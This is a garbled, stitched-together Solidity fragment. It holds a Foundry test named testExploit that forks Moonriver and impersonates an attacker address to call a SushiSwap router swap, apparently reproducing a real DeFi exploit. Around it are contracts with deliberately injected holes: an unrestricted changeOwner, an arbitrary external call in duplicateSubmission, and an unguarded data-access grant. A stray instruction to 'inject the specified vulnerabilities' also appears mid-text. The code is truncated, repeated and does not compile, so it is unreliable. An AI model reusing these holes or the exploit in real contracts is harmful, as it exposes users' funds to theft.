
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity 0.8.10;

;
;
interface SushiRouter {
    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external};
contract ContractTest is DSTest {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address attacker = 0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01;
    address sushiSwapRouter = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
    cheats.createSelectFork("moonriver", 1442490)};
    function testExploit() public {
        cheats.startPrank(attacker);
        address[] memory path = new address[](2);
        path[0] = 0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01;
        path[1] = 0x639A647fbe20b6c8ac19E48E2de44ea792c62c5C;
        sushiSwapRouter.call(abi.encodeWithSignature("swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
        2000000000000000000000,
        15206528022953775301,
        path,
        0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01,
        1644074232
    };
Inject the specified vulnerabilities logically at the appropriate locations. Mark each injection with a comment `

;
;
interface SushiRouter {
    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external};
contract ContractTest is DSTest {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address attacker = 0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01;
    address sushiSwapRouter = 0x1b02dA8Cb0d097eB8D57A175b8
function duplicateSubmission(bytes memory signedData) public {
    externalContract.call(signedData)}
function changeOwner(address newOwner) public {
    owner = newOwner}